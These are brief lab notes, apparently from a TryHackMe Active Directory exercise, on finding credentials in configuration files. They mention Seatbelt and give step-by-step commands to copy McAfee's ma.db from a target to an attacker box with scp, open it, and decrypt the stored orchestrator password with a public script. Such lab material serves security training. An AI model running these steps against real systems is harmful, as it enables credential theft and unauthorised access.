# Configuration Files
- Various configuration files may be of value for enumeration: 
  - Web application config files
  - Service configuration files
  - Registry keys
  - Centrally deployed applications

- You may use [Seatbelt](https://github.com/GhostPack/Seatbelt) to automate this enumeration process.

## Credential Recovery from McAfee Enterprise Endpoint Security
- McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db.
``` bash
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB      

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db      
               1 File(s)        120,832 bytes     
               2 Dir(s)  39,426,285,568 bytes free
```

1. We can use SCP to copy the ma.db to our AttackBox
```bash
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```
2. read the SQL file:
```
sqlitebrowser ma.db
```

3. decrypt the password with this [repo](https://github.com/funoverip/mcafee-sitelist-pwd-decryption). Note that is it running on python2.
```
python2 mcafee_sitelist_pwd_decrypt.py <CRYPTED PASSWORD YOU SEE ON DB>
```

```
